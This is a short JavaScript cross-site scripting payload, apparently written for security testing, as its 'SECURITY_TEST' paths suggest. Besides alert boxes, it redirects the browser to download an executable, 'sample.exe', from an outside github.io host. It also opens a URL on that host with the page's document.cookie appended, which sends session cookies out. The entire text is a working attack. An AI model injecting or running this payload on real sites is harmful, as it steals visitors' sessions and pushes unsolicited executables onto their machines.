alert("XSS TEST");
alert(document.cookie);
document.location.href="https://ninzacode.github.io/SECURITY_TEST/sample.exe";
window.open("https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+encodeURIComponent(document.cookie), target="_blank");
